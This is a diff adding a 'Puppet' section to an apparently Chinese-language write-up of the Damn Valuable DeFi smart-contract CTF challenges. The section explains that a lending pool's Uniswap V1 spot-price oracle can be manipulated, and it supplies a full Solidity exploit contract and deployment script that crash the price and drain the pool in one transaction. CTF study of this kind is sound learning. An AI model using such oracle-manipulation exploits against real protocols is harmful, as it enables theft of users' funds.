@@ -720,7 +720,7 @@ it('Execution', async function () {
     }
     ```
 
-!!! note "contracts/the-rewarder/TheRewarderTest.sol"
+??? note "contracts/the-rewarder/TheRewarderTest.sol"
 
     ```js
     // SPDX-License-Identifier: MIT
@@ -1171,3 +1171,95 @@ function exploit() internal override {
     vm.stopPrank();
 }
 ```
+
+## 8. Puppet
+
+> There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.
+>
+> There’s a DVT market opened in an old [Uniswap v1 exchange](https://docs.uniswap.org/contracts/v1/overview), currently with 10 ETH and 10 DVT in liquidity.
+>
+> Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance.
+
+- 从 `PuppetPool` 借出 token 需要 deposit 一定数量的 ETH，由 `calculateDepositRequired()` 决定，而 `depositRequired` 的计算基于 UniswapV1Pair 的实时余额
+
+    ```js
+    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
+        return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
+    }
+
+    function _computeOraclePrice() private view returns (uint256) {
+        // calculates the price of the token in wei according to Uniswap pair
+        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
+    }
+    ```
+
+- Uniswap V1 不支持 Flash swap，可以在 borrow 前 swap 来降低 `uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair)`，从而以低价借出 token
+- `player` 只能执行一个交易，而 `DamnValuableToken` 支持 `permit`，因此不需要额外的交易来调用 `approve()`
+
+    ```js
+    expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
+    ```
+
+### Exploit
+
+```js
+interface UniswapExchangeInterface {
+    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256 eth_bought);
+}
+
+contract PuppetPoolHack {
+    constructor(address _pool, uint8 v, bytes32 r, bytes32 s, uint256 deadline) payable {
+        PuppetPool pool = PuppetPool(_pool);
+        DamnValuableToken token = DamnValuableToken(pool.token());
+        token.permit(
+            msg.sender,
+            address(this),
+            1000 ether,
+            deadline,
+            v,
+            r,
+            s
+        );
+        token.transferFrom(msg.sender, address(this), 1000 ether);
+        token.approve(pool.uniswapPair(), 1000 ether);
+        UniswapExchangeInterface(pool.uniswapPair()).tokenToEthSwapInput(1000 ether, 1, block.timestamp);   // since the contract is not deployed, ETH can be sent directly to the address
+        pool.borrow{value: address(this).balance}(100000 ether, msg.sender);
+    }
+
+}
+```
+
+```js
+const { signERC2612Permit } = require('eth-permit');
+
+it('Execution', async function () {
+    const hackFactory = await ethers.getContractFactory('PuppetPoolHack', player);
+
+    let hackAddress = ethers.utils.getContractAddress({
+        from: player.address,
+        nonce: await player.getTransactionCount()
+    });
+
+    let signature = await signERC2612Permit(
+        player, 
+        token.address, 
+        player.address,
+        hackAddress, 
+        PLAYER_INITIAL_TOKEN_BALANCE
+    );        
+
+    await hackFactory.deploy(
+        lendingPool.address, 
+        signature.v,
+        signature.r,
+        signature.s,
+        signature.deadline,
+        { value: 10n * 10n ** 18n, gasLimit: 10**6 }
+    );
+});
+```
+
+### References
+
+- [Exchange | Uniswap](https://docs.uniswap.org/contracts/v1/reference/exchange)
+- [A Long Way To Go: On Gasless Tokens and ERC20-Permit](https://soliditydeveloper.com/erc20-permit#frontend-usage)
